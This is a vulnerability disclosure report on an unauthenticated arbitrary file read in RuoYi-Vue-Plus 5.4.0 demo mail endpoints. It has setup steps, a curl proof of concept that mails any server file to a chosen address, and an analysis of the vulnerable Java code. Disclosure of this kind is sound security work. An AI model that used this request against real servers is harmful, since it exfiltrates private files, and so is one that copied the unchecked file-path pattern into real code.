# RuoYi-Vue-Plus Vulnerability Report

This document describes a `Arbitrary File Read` vulnerability found in the [RuoYi-Vue-Plus](https://github.com/dromara/RuoYi-Vue-Plus) repository.  

Discovery Date: 2025-06-20

The official website of the project is: [https://dromara.org/](https://plus-doc.dromara.org/#/)

## Vulnerability Details

In the `RuoYi-Vue-Plus` project, The endpoints `/demo/mail/sendMessageWithAttachment` and `/demo/mail/sendMessageWithAttachments` in `MailController.java` can be accessed without authentication and allow attackers to specify arbitrary file paths as email attachments. This leads to an `arbitrary file read` vulnerability, enabling exfiltration of sensitive files from the server.

- **Project Link:** `https://github.com/dromara/RuoYi-Vue-Plus`

- **Affected Version:** `5.4.0`

- **Affected API:** `/demo/mail/sendMessageWithAttachment` and `/demo/mail/sendMessageWithAttachments`

- **Code Location:** `/src/main/java/org/dromara/demo/controller/MailController.java`

## Test Environment Setup

1. **JDK 17**

2. **Maven Build**

3. **Mysql Database Startup**

```bash
docker run --name mysql-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD='root' -e MYSQL_DATABASE=ry-vue mysql:latest
```

4. **Database Initialization**

Execute the following SQL scripts in the `/RuoYi-Vue-Plus-5.4.0/script/sql` directory in the following order:

`ry_vue_5.X.sql`

`ry_job.sql`

`ry_workflow.sql`

5. **Redis Startup**
```bash
docker run -d --name redis-test -p 6379:6379 redis:latest \
redis-server --requirepass ruoyi123
```

6. **Modify the Email Sending Configuration.**

Update the following settings in the `/ruoyi-admin/src/main/resources/application-dev.yml` configuration file.

```yml
--- # mail 邮件发送
mail:
  enabled: true
  host: smtp.163.com
  port: 465
  # 是否需要用户名密码验证
  auth: true
  # 发送方，遵循RFC-822标准
  from: xxxxxx@163.com
  # 用户名（注意：如果使用foxmail邮箱，此处user为qq号）
  user: xxxxxx@163.com
  # 密码（注意，某些邮箱需要为SMTP服务单独设置密码，详情查看相关帮助）
  pass: xxxxxx
  # 使用 STARTTLS安全连接，STARTTLS是对纯文本通信协议的扩展。
  starttlsEnable: false
  # 使用SSL安全连接
  sslEnable: true
  # SMTP超时时长，单位毫秒，缺省值不超时
  timeout: 0
  # Socket连接超时值，单位毫秒，缺省值不超时
  connectionTimeout: 0
```

Set the `from` and `user` fields to the email address used for sending emails. 

For the `pass` field, a separate SMTP password (not the account's original password) must be configured in 163 Mail. 

Additionally, if you continue to use a 163 mailbox for testing, the `starttlsEnable` parameter must be set to `false`.

7. **Launch the project via IDEA**

Start the following three services:

`DromaraApplication`, which will run on port `8080`;

`MonitorAdminApplication`, which will run on port `9090`;

`SnailJobServerApplication`, which will run on port `8800`.

## Steps to Reproduce

### 1. Trigger `Arbitrary File Read`

Run the following command.

```bash
curl -X GET "http://localhost:8080/demo/mail/sendMessageWithAttachment?to=xxxxxx@163.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/path/to/secret"
```

Here, the `/sendMessageWithAttachment` interface was tested. The `to` parameter specifies the recipient's email address, `subject` is the email subject, `text` is the email body, and `filePath` indicates the path of the file to be attached — which can be any file on the system.

The response will be:

```sh
{"code":200,"msg":"操作成功","data":null}%  
```

Indicates that the email was sent successfully.

### 2. Check the Email

![Local Image](email.png)

The `secret` file has been received.

The `/sendMessageWithAttachments` interface uses the same underlying logic, but allows sending multiple attachments at once. This will not be elaborated here.

## Code Analysis

1. At line `50` of `MailController.java`, it received parameters from external sources and called the function `MailUtils.sendText` without validation..

```java
@GetMapping("/sendMessageWithAttachment")
public R<Void> sendMessageWithAttachment(String to, String subject, String text, String filePath) {
    MailUtils.sendText(to, subject, text, new File(filePath));
    return R.ok();
}
```

2. In `MailUtils.java`, the parameters are passed through multiple times, but no validation is performed on the file or the destination address.

3. Finally, at line `416` of `MailUtils.java`, the function `send` is declared. 

And at line `444`, it called `JakartaMail.send()` to send the email.

```java
private static String send(MailAccount mailAccount, boolean useGlobalSession, Collection<String> tos, Collection<String> ccs, Collection<String> bccs, String subject, String content,
                               Map<String, InputStream> imageMap, boolean isHtml, File... files) {
    final JakartaMail mail = JakartaMail.create(mailAccount).setUseGlobalSession(useGlobalSession);

    // 可选抄送人
    if (CollUtil.isNotEmpty(ccs)) {
        mail.setCcs(ccs.toArray(new String[0]));
    }
    // 可选密送人
    if (CollUtil.isNotEmpty(bccs)) {
        mail.setBccs(bccs.toArray(new String[0]));
    }

    mail.setTos(tos.toArray(new String[0]));
    mail.setTitle(subject);
    mail.setContent(content);
    mail.setHtml(isHtml);
    mail.setFiles(files);

    // 图片
    if (MapUtil.isNotEmpty(imageMap)) {
        for (Entry<String, InputStream> entry : imageMap.entrySet()) {
            mail.addImage(entry.getKey(), entry.getValue());
            // 关闭流
            IoUtil.close(entry.getValue());
        }
    }

    return mail.send();
}
```

Therefore, through the above interface, an attacker can obtain any file from the system by sending emails without logging in.
